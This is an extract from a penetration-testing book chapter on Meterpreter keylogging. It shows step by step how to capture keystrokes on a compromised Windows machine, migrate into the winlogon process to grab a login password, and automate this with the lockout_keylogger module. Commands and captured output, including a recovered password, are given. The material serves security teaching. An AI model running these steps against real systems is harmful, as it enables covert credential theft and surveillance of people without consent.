  md: '# Chapter 20 - Keyscan and Lockout Keylogger


    # Introduction


    Sometimes a penetration tester may have remote access to a user''s machine, but
    he may not have the user''s password. Maybe the user has a very long complex password
    that would just take too long to crack. What could he do?


    Meterpreter in the Metasploit Framework has a great utility for capturing keys
    pressed on a target machine. We will start with a system that we have already
    run an exploit on and were successful in creating a remote session with Metasploit.
    We connected to the session with the session command and are now sitting at a
    Meterpreter prompt.


    # Key logging with Meterpreter


    We will start with a system that we have already run an exploit on and were successful
    in creating a remote session with Metasploit. We connected to the session with
    the "***session -i <ID#>***" command and are now sitting at a Meterpreter prompt.


    ```

    meterpreter > getuid

    Server username: NT AUTHORITY\SYSTEM

    meterpreter >

    ```


    If we type "***help***" at the Meterpreter prompt we will be given a list of commands
    that we can run. For this section we are concerned with just the "keyscan" commands:


    ```

    keyscan_dump   Dump the keystroke buffer

    keyscan_start  Start capturing keystrokes

    keyscan_stop   Stop capturing keystrokes

    ```


    So let''s go ahead and see what it looks like when we start a remote keylogger,
    then we will view the captured key strokes.


    +   1. Simply type "***keyscan_start***" to start the remote logging.


    ```

    meterpreter > keyscan_start

    Starting the keystroke sniffer...

    meterpreter >

    ```


    +   2. Now we just need to wait until our victim types some things on the keyboard.
    For our example, go ahead and open your Windows 7 browser and perform a search
    in Google.


    +   3. Now back on the Kali system, to see what was typed simply enter "***keyscan_dump***":


    ```

    keyscan_dump

    Dumping captured keystrokes...

    google.com <Return> will Dallas go 8 an 8 again this year? <Return>

    meterpreter >

    ```


    Here you can see from this demo that our target user went to "google.com" and
    searched for "will Dallas go 8 and 8 again this year?"'
  merge: -1
  pgno: 163
- img_proc: false
  md: 'Well, obviously our user is a Dallas Cowboys football fan. Let''s try one more
    thing. What happens if the user uses special keys like the Windows key? What if
    the user used the "Windows" + "l" key to lock his keyboard, and then use his password
    to get back in?


    Go ahead and try it. Lock your Windows system with the "Windows" and "L" key.
    Then log back in with the password.


    Now back on the Kali system type keyscan_dump to see what we have:


    ```

    meterpreter > keyscan_dump

    Dumping captured keystrokes...

    <LWin> l

    meterpreter >

    ```


    Okay, it correclty recorded that I pressed the "<LWin>" or left windows key and
    the "L" key. But I logged back in with a password, where is the password?


    *It wasn''t recorded!*


    The problem is in the way Windows security works. Simply put, the active session
    (desktop) and winlogon (Login process) use different keyboard buffers. If you
    are sniffing the active session, you cannot capture keys entered for a login,
    or vice versa.


    You need to move your key logger to the session that you want to monitor. So in
    this case, simply migrating our Meterpreter shell to the winlogon process puts
    us in the correct mode to look for passwords.


    Then start keyscan again.


    +   4. Type ***"ps"*** in Meterpreter to get a process list. Look for the PID
    of the process "winlogon".


    ![](bbox=[0.006, 0.546, 0.6, 0.753])


    As you can see in the image above winlogon.exe has the process ID number 432.
    We need to migrate our Meterpreter session to that ID.


    +   5. Type ***"migrate <winlogin PID#>"*** or in our case here ***"migrate 432"***.


    ![](bbox=[0.006, 0.875, 0.423, 0.942])


    (Note: If you get an *"insufficient privileges"* error, you will need to run the
    Bypass UAC module and elevate your level to "system". See the "Bypass UAC" section
    in this book for more information.)'
  merge: -1
  pgno: 164
- img_proc: false
  md: '+   6. Now go ahead and start the keyscan again, lock the Windows 7 workstation
    and log back in. Then dump the keylog to view the user password:


    ```

    meterpreter > keyscan_start

    Starting the keystroke sniffer...

    meterpreter > keyscan_dump

    Dumping captured keystrokes...

    #LongPasswordsAreTheWayToGo! <Return>

    meterpreter >

    ```


    We got it!


    In the picture above, notice the "*Windows*" + "*L*" keystroke to lock the desktop
    does not show up. This is because we are now monitoring the winlogon session key
    buffer, so it is not displayed. But we have the password.


    So in essence, because our target needed another cup of coffee to get through
    his busy day of web surfing, he locked his desktop and then logged in again. When
    he did we were able to grab his full 28 character password.


    # Automating KeyScanning with Lockout Keylogger


    Now, what would be great is if we could automate this process. I mean do you really
    want to just sit there and hang out until the user leaves his system?


    You could force his desktop into locked mode and make him log in again, but that
    is pretty suspicious.


    What if you could have Meterpreter automatically find and migrate to the winlogon
    process, then scan the computer idle time and automatically put the user''s system
    into locked mode?


    Finally, what would be really nice too is if the script notified you when the
    user logs back in and gives you a text dump of his password.


    Meet "Lockout_Keylogger", an amazing script made by CG and Mubix.


    +   1. You need to start with an active remote session with "system" level privileges.


    ```

    meterpreter > getuid

    Server username: NT AUTHORITY\SYSTEM

    meterpreter >

    ```


    +   2. Now just type, "***background***" to back out to the session and return
    to the Meterpreter prompt.

    3. Type, "***use post/windows/capture/lockout_keylogger***".

    4. Set the session number to our active session (3 in our example), so "***set
    session 3***".

    5. Then type "***exploit***":'
  merge: -1
  pgno: 165
- img_proc: false
  md: '![](bbox=[0.0, 0.0, 1.0, 0.18])


    Lockout_Keylogger automatically finds the Winlogon process and migrates to it.
    The program then begins to monitor the remote system idle time.


    At about 300 seconds of idle time, Lockout Keylogger tries to lock the user''s
    desktop remotely.


    Sometimes it fails and tries locking it again:


    ![](bbox=[0.0, 0.3, 1.0, 0.5])


    Okay, lockout has successfully locked the workstation, and begins looking for
    keystrokes.


    If our user returns and enters his password to unlock the system, we get it:


    ![](bbox=[0.0, 0.58, 1.0, 0.7])


    Got it!


    Well, almost…


    It seems that the last two characters were cut off on the recovered password.
    Not sure if that is a password length buffer limit in the program or something
    else. But for a program that was written a few years ago, it still seems to work
    very well.


    # Conclusion


    In this section we demonstrated how to use Metasploit in Kali to capture key strokes
    from a remote system. We also learned that login passwords will not be recorded
    normally in a keystroke password as the Windows Logon service uses a different
    keyboard buffer. But if we move our keylogger to that process we can indeed capture
    logon credentials.


    We were also introduced to a handy program that migrates out session to the Winlogon
    process, watches the idle time of the system, then locks it and captures the password
    when the user tries to log back in.'
  merge: -1
  pgno: 166
- img_proc: false
  md: 'Lockout_Keylogger automates the entire process from beginning to end. The user
    walks away from his PC, the script waits a certain amount of idle time and then
    puts the computer into locked mode. Then, when he logs back in, it is already
    set to scan the keys pressed.


    The password could be a simple password or a complex monster, it does not matter.
    Lockout_Keylogger intercepts it and displays it in plain text on the penetration
    tester''s machine.'
